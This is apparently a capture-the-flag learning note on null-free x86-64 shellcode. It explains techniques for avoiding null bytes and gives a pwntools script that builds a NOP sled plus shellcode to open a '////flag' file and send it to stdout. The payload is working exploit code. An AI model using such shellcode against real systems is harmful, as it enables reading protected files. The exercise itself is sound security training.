# NULL-Free Shellcode

#### Shell code cannot contain any null bytes not. To get around this, xor and push/pop will set register values without appending null bytes. For the file name, it treats "/" the same as "/////", so fill the 8 bytes where null bytes would go with extra forward slashes. Also have to use the inner part of the register in r10 to specifically point to the word that way it doesnt append nulls to the entire register.
```python
from pwn import *
import sys

context.arch = 'amd64'

asmbly = """
xor rsi, rsi
push rsi
mov rdi, 0x67616c662f2f2f2f
push rdi
mov rdi, rsp
push 2
pop rax
xor rdx, rdx
syscall

mov rsi, rax
push 1
pop rdi
xor r10, r10
mov r10w, 1000
push 40
pop rax
xor rdx, rdx
syscall

push 60
pop rax
syscall
"""

asmbly = asm(asmbly)
fill = b'\x90' * 2100
sys.stdout.buffer.write(fill + asmbly)
```
